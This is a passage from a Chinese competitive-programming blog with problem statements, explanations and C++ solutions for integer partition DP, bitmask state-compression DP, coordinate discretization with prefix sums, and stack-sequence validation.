id="洛谷p1025">洛谷P1025</h2><p><strong>题目描述</strong></p><p>将整数 <span class="math inline">\(n\)</span> 分成 <spanclass="math inline">\(k\)</span>份，且每份不能为空，任意两个方案不相同（不考虑顺序）。</p><p>例如：<span class="math inline">\(n=7\)</span>，<spanclass="math inline">\(k=3\)</span>，下面三种分法被认为是相同的。</p><p><span class="math inline">\(1,1,5\)</span>;<br /><span class="math inline">\(1,5,1\)</span>;<br /><span class="math inline">\(5,1,1\)</span>.</p><p>问有多少种不同的分法。</p><p><strong>输入格式</strong></p><p><span class="math inline">\(n,k\)</span> （<spanclass="math inline">\(6&lt;n \le 200\)</span>，<spanclass="math inline">\(2  \le k  \le  6\)</span>）</p><p><strong>输出格式</strong></p><p><span class="math inline">\(1\)</span> 个整数，即不同的分法。</p><h2 id="思路">思路</h2><p>思路类似于分苹果</p><ol type="1"><li>当分割数<span class="math inline">\(j\)</span>大于数<spanclass="math inline">\(i\)</span>的时候,那么没有一种分法可行</li><li>当分割数<span class="math inline">\(j\)</span>等于数<spanclass="math inline">\(i\)</span>的时候,那么只有一种分法</li><li>当分割数<span class="math inline">\(j\)</span>小于数<spanclass="math inline">\(i\)</span>的时候,一种是可以先在每个盘子里面分一个，问题可转换为分割术<spanclass="math inline">\(j\)</span>分割 数<spanclass="math inline">\(i-j\)</span>；另一种是可以将盘子数减少一个(或者更多)</li></ol><h2 id="代码-2">代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">210</span>,K = <span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> dp[N][N];<br><span class="hljs-type">int</span> n,k;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cin&gt;&gt;n&gt;&gt;k;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;=n;i++) dp[i][i] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;i&lt;=n;i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>;j&lt;=k;j++)&#123;<br>            dp[i][j] = dp[i<span class="hljs-number">-1</span>][j<span class="hljs-number">-1</span>] + dp[i - j][j];<br>        &#125;<br>    &#125;<br>    cout&lt;&lt;dp[n][k]&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="状态压缩dp">状态压缩DP</h1><h2 id="基本思路">基本思路</h2><p>状态压缩DP其实是一种<strong>暴力的算法</strong>，因为它需要遍历每个状态，而每个状态是多个事件的集合，也就是<strong>以集合为状态，一个集合就是一个状态</strong>。集合问题一般是指数复杂度的NP问题，所以状态压缩DP的复杂度仍然是指数的，只能用于小规模问题的求解。</p><p>为了方便地<strong>同时表示一个状态的多个事件</strong>，状态一般用二进制数来表示。<strong>一个数就能表示一个状态</strong>，通常一个状态数据就是一个一串0和1组成的二进制数，每一位二进制数只有两种状态，比如说硬币的正反两面，10枚硬币的结果就可以用10位二进制数完全表示出来，每一个10位二进制数就表示了其中一种结果。</p><figure><imgsrc="https://pic2.zhimg.com/80/v2-0af09891a956d1bc9ffe6aa112dbd1a5_720w.webp"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>使用二进制数表示状态不仅<strong>缩小了数据存储空间</strong>，还能利用二进制数的位运算很方便地<strong>进行状态转移</strong>。</p><h2 id="acwing291.-蒙德里安的梦想">acwing291. 蒙德里安的梦想</h2><p>求把 <span class="math inline">\(N \times M\)</span>的棋盘分割成若干个 1×21×2 的长方形，有多少种方案。</p><p>例如当 N=2，M=4时，共有 55 种方案。当 N=2，M=3 时，共有 33种方案。</p><p>如下图所示：</p><figure><imgsrc="https://cdn.acwing.com/media/article/image/2019/01/26/19_4dd1644c20-2411_1.jpg"alt="2411_1.jpg" /><figcaption aria-hidden="true">2411_1.jpg</figcaption></figure><h3 id="输入格式-1">输入格式</h3><p>输入包含多组测试用例。</p><p>每组测试用例占一行，包含两个整数 N 和 M。</p><p>当输入用例 N=0，M=0时，表示输入终止，且该用例无需处理。</p><h3 id="输出格式-1">输出格式</h3><p>每个测试用例输出一个结果，每个结果占一行。</p><h3 id="数据范围">数据范围</h3><p>1≤N,M≤11</p><h3 id="输入样例">输入样例：</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span><span class="hljs-number">2</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">3</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">4</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">2</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">3</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">4</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">11</span><br><span class="hljs-symbol">4 </span><span class="hljs-number">11</span><br><span class="hljs-symbol">0 </span><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h3 id="输出样例">输出样例：</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs">1<br>0<br>1<br>2<br>3<br>5<br>144<br>51205<br></code></pre></td></tr></table></figure><h3 id="代码解释">代码解释</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">12</span>,M=<span class="hljs-number">1</span>&lt;&lt;N;<br><span class="hljs-type">bool</span> col_state[N];<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> dp[N][M];<br>vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">row_state</span>(M);<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,m;<br>    <span class="hljs-keyword">while</span>(cin&gt;&gt;n&gt;&gt;m)&#123;<br>        <span class="hljs-keyword">if</span>(n == <span class="hljs-number">0</span> &amp;&amp; m == <span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>; <br>        <span class="hljs-comment">//两个都为0代表输入结束</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;(<span class="hljs-number">1</span>&lt;&lt;n);i++)&#123; <br>            <span class="hljs-comment">//首先要预处理一列中的每一种状态，如果出现奇数个空格，那么就不能填满</span><br>            <span class="hljs-type">int</span> cnt = <span class="hljs-number">0</span>; <br>            <span class="hljs-comment">//先初始化为0</span><br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>;j&lt;n;j++)&#123; <br>                <span class="hljs-comment">//寻找每一位连续空闲的个数</span><br>                <span class="hljs-keyword">if</span>((i&gt;&gt;j) &amp; <span class="hljs-number">1</span>)&#123; <br>                    <span class="hljs-comment">// 如果说当前被占用了，说明连续空闲已经结束</span><br>                    <span class="hljs-keyword">if</span>(cnt &amp; <span class="hljs-number">1</span>)&#123;<br>                        <span class="hljs-comment">//判断连续空闲个数是否是奇数个，如果是的话，那么当前状态就有问题</span><br>                        col_state[i] = <span class="hljs-literal">false</span>;<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                    cnt = <span class="hljs-number">0</span>; <br>                    <span class="hljs-comment">// 当前连续空闲个数恢复成0</span><br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    cnt++; <br>                    <span class="hljs-comment">// 如果当前没被占用，那么连续空闲个数就加1</span><br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(cnt &amp; <span class="hljs-number">1</span>) col_state[i] = <span class="hljs-literal">false</span>; <br>            <span class="hljs-comment">// 处理特殊情况，如果说当前二进制数最高位为0（没被占用的话）</span><br>           <span class="hljs-comment">// 那么我们就没办法判断末尾连续空闲个数是否为奇数，所以要特判</span><br>            <span class="hljs-keyword">else</span> col_state[i] = <span class="hljs-literal">true</span>;<br>            <span class="hljs-comment">//如果都是偶数，说明当前列中的状态是可行的。</span><br>        &#125;<br>        <br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;(<span class="hljs-number">1</span>&lt;&lt;n);i++)&#123;<br>            <span class="hljs-comment">// 遍历第i列的每一种状态</span><br>            row_state[i].<span class="hljs-built_in">clear</span>();<br>            <span class="hljs-comment">// 清空当前预处理的值，否则可能会对下一输入的例子造成影响</span><br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>;j&lt;(<span class="hljs-number">1</span>&lt;&lt;n);j++)&#123;<br><span class="hljs-comment">// 遍历第i-1列的每一种状态</span><br>                <span class="hljs-keyword">if</span>((j &amp; i) == <span class="hljs-number">0</span> &amp;&amp; col_state[j | i])&#123;<br>                    <span class="hljs-comment">// 如果第i-1列在第i列要占用的对应格子是空出来的话，也就是格子占用了i-1列和i列，那么就没有冲突</span><br>                    <span class="hljs-comment">// 同时因为第i-1列格子是由第i-2列延申出来的，同时第i列格子是从第i-1列延申出来的</span><br>                    <span class="hljs-comment">// 所以第i列在j | i的对应格子都要被占用</span><br>                    row_state[i].<span class="hljs-built_in">push_back</span>(j);<br>                    <span class="hljs-comment">// 如果可行的话就加入数组中</span><br>                &#125;<br>            &#125;<br>        &#125;<br>        <br>        <span class="hljs-built_in">memset</span>(dp, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span> dp);  <br>        <span class="hljs-comment">// 初始化</span><br>        dp[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>; <br>        <span class="hljs-comment">// 因为第一列不能由-1列延申出来，所以第一列只有一种方法就是全部格子都不被占用</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;i&lt;=m;i++)&#123; <br>        <span class="hljs-comment">// 遍历第2列到第m列，这里遍历到第m+1列是为了记录第m列没有凸出来的情况</span><br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>;j&lt;(<span class="hljs-number">1</span>&lt;&lt;n);j++)&#123;<br>                <span class="hljs-comment">// 遍历第i列每种可能的状态</span><br>                <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> k:row_state[j])&#123; <br>                    <span class="hljs-comment">// 遍历在当前状态下，第i-1可行的方案</span><br>                    dp[i][j] += dp[i<span class="hljs-number">-1</span>][k];<br>                &#125;<br>            &#125;<br>        &#125;<br>        <br>        cout&lt;&lt;dp[m][<span class="hljs-number">0</span>]&lt;&lt;endl; <span class="hljs-comment">// 输出第m列且没有凸出来的情况</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="离散化">离散化</h1><h2 id="离散化思想">离散化思想</h2><p>为什么要离散化？</p><p>因为存储的下标实在太大了，如果直接开这么大的数组，根本不现实，第二个原因，本文是数轴，要是采用下标的话，可能存在负值，所以也不能，所以有人可能会提出用哈希表，哈希表可以吗？答案也是不可以的，因为哈希表不能像离散化那样缩小数组的空间，导致我们可能需要从-e9遍历到1e9（此处的含义就是假如我们需要计算1e-9和1e9区间内的值，那我们需要从前到后枚举，无论该值是否存在），因为哈希表不能排序，所以我们一般不能提前知道哪些数轴上的点存在哪些不存在，所以一般是从负的最小值到正的最大值都枚举一遍，时间负责度太高，于是就有了本题的离散化。</p><p>离散化的本质，是映射，将间隔很大的点，映射到相邻的数组元素中。减少对空间的需求，也减少计算量。</p><p>其实映射最大的难点是前后的映射关系，如何能够将不连续的点映射到连续的数组的下标。此处的解决办法就是开辟额外的数组存放原来的数组下标，或者说下标标志，本文是原来上的数轴上的非连续点的横坐标。此处的做法是是对原来的数轴下标进行排序，再去重，为什么要去重呢，因为本题提前考虑了前缀和的思想，其实很简单，就是我们需要求出的区间内的和的两端断点不一定有元素，提前加如需要求前缀和的两个端点，有利于我们进行二分搜索，其实二分搜索里面我们一般假定有解的，如果没解的话需要特判，所以提前加入了这些元素，从而导致可能出现重复元素。</p><h2 id="例题--acwing区间和">例题--ACwing区间和</h2><p>假定有一个无限长的数轴，数轴上每个坐标上的数都是 00。</p><p>现在，我们首先进行 n 次操作，每次操作将某一位置 x上的数加 c。</p><p>接下来，进行 m次询问，每个询问包含两个整数 l 和 r，你需要求出在区间[l,r] 之间的所有数的和。</p><h3 id="输入格式-2">输入格式</h3><p>第一行包含两个整数 n和 m。</p><p>接下来 n行，每行包含两个整数 x 和 c。</p><p>再接下来 m行，每行包含两个整数 l 和 r。</p><h3 id="输出格式-2">输出格式</h3><p>共 m 行，每行输出一个询问中所求的区间内数字和。</p><h3 id="数据范围-1">数据范围</h3><p><span class="math inline">\(-10^{9} &lt; x &lt; 10^{9}\)</span></p><p><span class="math inline">\(1\le n,m \le 10^{5}\)</span></p><p><span class="math inline">\(-10^{9}\le l \le r \le10^{9}\)</span></p><p><span class="math inline">\(-10000 \le c \le 10000\)</span></p><h3 id="输入样例-1">输入样例：</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">3 </span><span class="hljs-number">3</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">2</span><br><span class="hljs-symbol">3 </span><span class="hljs-number">6</span><br><span class="hljs-symbol">7 </span><span class="hljs-number">5</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">3</span><br><span class="hljs-symbol">4 </span><span class="hljs-number">6</span><br><span class="hljs-symbol">7 </span><span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><h3 id="输出样例-1">输出样例：</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">8<br>0<br>5<br></code></pre></td></tr></table></figure><h3 id="代码解释-1">代码解释</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">300010</span>;<br><span class="hljs-keyword">typedef</span> pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt; PII;<br><span class="hljs-type">int</span> a[N],s[N];<br>vector&lt;<span class="hljs-type">int</span>&gt; alls;<br><span class="hljs-comment">// 记录所有需要离散化的数值</span><br>vector&lt;PII&gt; add,query;<br><span class="hljs-comment">// add用来存储对应点加的数，query用来存储查询区间</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span>&#123; <br>    <span class="hljs-comment">// 找到离散化后的下标</span><br>    <span class="hljs-type">int</span> left = <span class="hljs-number">0</span>,right = alls.<span class="hljs-built_in">size</span>();<br>    <span class="hljs-keyword">while</span>(left&lt;right)&#123;<br>        <span class="hljs-comment">// 找到第一个大于等于x的数</span><br>        <span class="hljs-type">int</span> mid = (left + right ) &gt;&gt; <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span>(alls[mid] &gt;= x) right = mid;<br>        <span class="hljs-keyword">else</span> left = mid + <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> left + <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">// 返回下表从1开始，因为这样构建前缀和比较方便</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">int</span> n,m;<br>    cin&gt;&gt;n&gt;&gt;m;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;n;i++)&#123; <br>        <span class="hljs-type">int</span> x,c;<br>        cin&gt;&gt;x&gt;&gt;c;<br>        add.<span class="hljs-built_in">push_back</span>(&#123;x,c&#125;);<br>        alls.<span class="hljs-built_in">push_back</span>(x);<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;m;i++)&#123;<br>        <span class="hljs-type">int</span> left,right;<br>        cin&gt;&gt;left&gt;&gt;right;<br>        query.<span class="hljs-built_in">push_back</span>(&#123;left,right&#125;);<br>        alls.<span class="hljs-built_in">push_back</span>(left);<br>        <span class="hljs-comment">// 将查询区间的左端点和右端点加入待离散化数组里</span><br>        <span class="hljs-comment">// 如果不离散化的区间点的话，有可能出现该区间找不到离散化后的对应下标</span><br>        alls.<span class="hljs-built_in">push_back</span>(right);<br>    &#125;<br>    <br>    <span class="hljs-built_in">sort</span>(alls.<span class="hljs-built_in">begin</span>(),alls.<span class="hljs-built_in">end</span>()); <br>    <span class="hljs-comment">// 进行排序</span><br>    alls.<span class="hljs-built_in">erase</span>(<span class="hljs-built_in">unique</span>(alls.<span class="hljs-built_in">begin</span>(),alls.<span class="hljs-built_in">end</span>()),alls.<span class="hljs-built_in">end</span>());<br>    <span class="hljs-comment">// 去除重复的元素，防止一个点离散化到多个下标上</span><br>    <br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> item:add)&#123;<br>        <span class="hljs-type">int</span> x = <span class="hljs-built_in">find</span>(item.first);<br>        a[x] += item.second;<br>    &#125;<br>    <span class="hljs-comment">// 构建差分矩阵</span><br>    <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;i&lt;=alls.<span class="hljs-built_in">size</span>();i++)<br>        s[i] = s[i <span class="hljs-number">-1</span>] + a[i];     <br>   <span class="hljs-comment">// 构建前缀和矩阵</span><br>    <br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> item:query)&#123;<br>        <span class="hljs-type">int</span> left = <span class="hljs-built_in">find</span>(item.first);<br>        <span class="hljs-type">int</span> right = <span class="hljs-built_in">find</span>(item.second);<br>        cout&lt;&lt;s[right] - s[left - <span class="hljs-number">1</span>]&lt;&lt;endl;<br>    &#125;<br>    <span class="hljs-comment">// 找到区间对应的离散化后结果，然后运用前缀和进行求解</span><br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="验证栈序列">验证栈序列</h1><h2 id="题目描述-1">题目描述</h2><p>给出两个序列 pushed 和 poped 两个序列，其取值从 1 到 <spanclass="math inline">\(n(n\le100000)\)</span>。已知入栈序列是pushed，如果出栈序列有可能是 poped，则输出 <code>Yes</code>，否则输出<code>No</code>。为了防止骗分，每个测试点有多组数据，不超过 <spanclass="math inline">\(5\)</span> 组。</p><h2 id="输入格式-3">输入格式</h2><p>第一行一个整数 <span class="math inline">\(q\)</span>，询问次数。</p><p>接下来 <span class="math inline">\(q\)</span>个询问，对于每个询问：</p><p>第一行一个整数 <span class="math inline">\(n\)</span>表示序列长度；</p><p>第二行 <span class="math inline">\(n\)</span>个整数表示入栈序列；</p><p>第三行 <span class="math inline">\(n\)</span>个整数表示出栈序列；</p><h2 id="输出格式-3">输出格式</h2><p>对于每个询问输出答案。</p><h2 id="样例-1">样例 #1</h2><h3 id="样例输入-1">样例输入 #1</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">2</span><br><span class="hljs-number">5</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span><br><span class="hljs-symbol">5 </span><span class="hljs-number">4</span> <span class="hljs-number">3</span> <span class="hljs-number">2</span> <span class="hljs-number">1</span><br><span class="hljs-number">4</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">4</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><h3 id="样例输出-1">样例输出 #1</h3><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">Yes</span><br><span class="hljs-keyword">No</span><br></code></pre></td></tr></table></figure><h2 id="代码-3">代码</h2><p>可以这样理解，a序列不断入栈，直到遇到和b序列当前的数相同。然后依次再不断出栈，直到栈顶和b序列当前数不同。当a序列遍历完如果栈不为空那么就不是一个合格的出栈顺序，如果为空就是合格的出栈顺序。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stack&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e6</span>+<span class="hljs-number">10</span>;<br>stack&lt;<span class="hljs-type">int</span>&gt; st;<br><span class="hljs-type">int</span> a[N],b[N],num;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">while</span>(n--)&#123;<br>        cin&gt;&gt;num;<br>        <span class="hljs-type">int</span> cnt = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;num;i++) cin&gt;&gt;a[i];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;num;i++) cin&gt;&gt;b[i];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;num;i++)&#123;<br>            st.<span class="hljs-built_in">push</span>(a[i]);<br>            <span class="hljs-keyword">while</span>(st.<span class="hljs-built_in">size</span>() &amp;&amp; st.<span class="hljs-built_in">top</span>() == b[cnt])&#123;<br>                st.<span class="hljs-built_in">pop</span>();<br>                cnt ++;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(st.<span class="hljs-built_in">size</span>()) cout&lt;&lt;<span class="hljs-string">&quot;No&quot;</span>&lt;&lt;endl;<br>        <span class="hljs-keyword">else</span> cout&lt;&lt;<span class="hljs-string">&quot;Yes&quot;</span>&lt;&lt;endl;<br>        <span class="hljs-keyword">while</span>(st.<span class="hljs-built_in">size</span>()) st.<span class="hljs-built_in">pop</span>();<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="二分类题型">二分类题型</h1><h2 